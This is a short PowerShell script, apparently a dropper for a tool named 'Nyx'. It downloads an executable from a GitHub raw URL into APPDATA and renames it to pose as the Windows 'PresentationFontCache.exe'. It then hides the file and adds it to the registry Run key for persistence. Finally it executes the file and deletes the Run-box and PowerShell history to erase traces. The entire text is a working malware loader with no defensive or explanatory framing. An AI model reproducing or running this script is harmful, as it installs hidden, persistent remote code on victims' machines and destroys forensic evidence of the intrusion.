# Nyx - X47QREX9

# Create folder for Nyx
New-Item -Path "$env:APPDATA" -Name "X47QREX9" -ItemType Directory

# Download Nyx
Invoke-WebRequest https://raw.githubusercontent.com/VVolfCZ/ProjectNyx/main/X47QREX9/X47QREX9.exe -OutFile "$env:APPDATA\X47QREX9\X47QREX9.exe"

# Change Nyx name
Rename-Item -Path "$env:APPDATA\X47QREX9\X47QREX9.exe" -NewName "PresentationFontCache.exe"

# Hide Nyx
$FILE=Get-Item "$env:APPDATA\X47QREX9\PresentationFontCache.exe" -Force
$FILE.attributes='Hidden'

# Add Nyx to startup processes
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" `
-Name "X47QREX9" `
-Value "$env:APPDATA\X47QREX9\PresentationFontCache.exe"

# Run Nyx
& "$env:APPDATA\X47QREX9\PresentationFontCache.exe"

# Delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f 

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue
